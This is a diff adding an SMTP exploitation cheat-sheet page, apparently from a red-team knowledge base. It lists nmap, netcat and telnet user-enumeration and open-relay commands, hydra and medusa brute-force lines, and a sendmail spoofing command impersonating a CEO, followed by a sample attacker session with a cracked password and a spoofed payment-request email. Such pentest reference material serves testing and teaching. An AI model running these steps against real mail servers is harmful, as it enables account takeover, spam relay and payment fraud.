@@ -1,0 +1,196 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">SMTP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Email Security</strong> • Focus: <strong>SMTP Abuse & Mail Exploits</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    SMTP (Simple Mail Transfer Protocol) is used to send and relay emails. 
+    Misconfigured SMTP servers are exploited for open relay spamming, 
+    user enumeration, phishing, and spoofing. Weak authentication, 
+    lack of encryption, and verbose error messages make SMTP a 
+    valuable target for attackers. In Red Team ops, SMTP is leveraged 
+    for reconnaissance, social engineering, and sometimes as a pivot 
+    into internal systems.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Open Relays:</strong> Allow anyone to send mail through the server.</li>
+    <li><strong>User Enumeration:</strong> VRFY/EXPN commands leak valid usernames.</li>
+    <li><strong>Weak Authentication:</strong> Plaintext logins and reused creds.</li>
+    <li><strong>Spoofing:</strong> Lack of SPF/DKIM/DMARC validation enables phishing.</li>
+    <li><strong>Info Disclosure:</strong> Banner grabbing reveals versions and mail paths.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify SMTP servers on TCP/25, 465, 587.</li>
+    <li><strong>Enumeration:</strong> Banner grabbing, VRFY/EXPN, test authentication.</li>
+    <li><strong>Open Relay Abuse:</strong> Test if relaying external mail is possible.</li>
+    <li><strong>Spoofing:</strong> Craft forged sender headers to impersonate trusted domains.</li>
+    <li><strong>Exploitation:</strong> Phishing, spam, exfiltration, or credential brute-forcing.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint SMTP service.</li>
+    <li>Enumerate valid users with VRFY/EXPN.</li>
+    <li>Test for open relay misconfigurations.</li>
+    <li>Brute-force SMTP authentication if enabled.</li>
+    <li>Craft spoofed/phishing messages or pivot internally.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p 25,465,587 -sV --script smtp* [target]   # Enumerate SMTP service
+nc [target] 25                                   # Banner grab
+
+# ------------------------------
+# User Enumeration
+# ------------------------------
+telnet [target] 25
+EHLO attacker.com
+VRFY administrator
+EXPN admin-list
+
+# ------------------------------
+# Open Relay Testing
+# ------------------------------
+telnet [target] 25
+EHLO attacker.com
+MAIL FROM:<attacker@evil.com>
+RCPT TO:<victim@external.com>   # If accepted → open relay
+
+# ------------------------------
+# Brute Force SMTP Auth
+# ------------------------------
+hydra -l admin -P rockyou.txt -s 587 -S -vV -t 4 [target] smtp
+medusa -h [target] -u admin -P wordlist.txt -M smtp
+
+# ------------------------------
+# Spoofing Attack
+# ------------------------------
+sendmail -S [target]:25 -f ceo@company.com -t victim@target.com
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p 25 192.168.1.50 --script smtp-enum-users
+telnet 192.168.1.50 25
+VRFY jdoe
+MAIL FROM:<admin@corp.com>
+RCPT TO:<victim@gmail.com>
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p 25,587 192.168.1.50 -sV --script smtp-open-relay
+PORT    STATE SERVICE VERSION
+25/tcp  open  smtp    Postfix smtpd
+587/tcp open  smtp    Postfix submission
+
+[ saide ~ ]$ nc 192.168.1.50 25
+220 mail.corp.local ESMTP Postfix (Ubuntu)
+
+[ saide ~ ]$ telnet 192.168.1.50 25
+EHLO attacker.com
+250-mail.corp.local Hello attacker.com
+VRFY jdoe
+250 2.0.0 <jdoe@corp.local>
+
+[ saide ~ ]$ telnet 192.168.1.50 25
+MAIL FROM:<attacker@evil.com>
+250 2.1.0 Ok
+RCPT TO:<victim@gmail.com>
+250 2.1.5 Ok   <-- open relay confirmed
+
+[ saide ~ ]$ hydra -l admin -P rockyou.txt -s 587 192.168.1.50 smtp
+[587][smtp] host: 192.168.1.50   login: admin   password: Summer2025!
+
+[ saide ~ ]$ sendmail -S 192.168.1.50:25 -f ceo@corp.local -t victim@target.com
+Message queued → spoofed email delivered
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample SMTP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# SMTP Banner
+220 mail.corp.local ESMTP Postfix (Ubuntu)
+
+# User Enumeration
+VRFY jdoe → valid user: jdoe@corp.local
+
+# Open Relay Confirmation
+MAIL FROM:<attacker@evil.com>
+RCPT TO:<victim@gmail.com>
+Response: 250 2.1.5 Ok
+
+# Brute Force Results
+admin : Summer2025!
+
+# Spoofed Mail Delivered
+From: ceo@corp.local
+To: victim@target.com
+Subject: Urgent Payment Request
+Body: "Please process transfer today."
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting SMTP
+      </a>
+    </li>
+    <li>
+      <a href="https://owasp.org/www-community/vulnerabilities/SMTP_Injection" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        OWASP – SMTP Injection
+      </a>
+    </li>
+    <li>Red Team workflow: Banner grab → User enum → Relay abuse → Cred brute-force → Spoofing/phishing.</li>
+  </ul>
+</section>
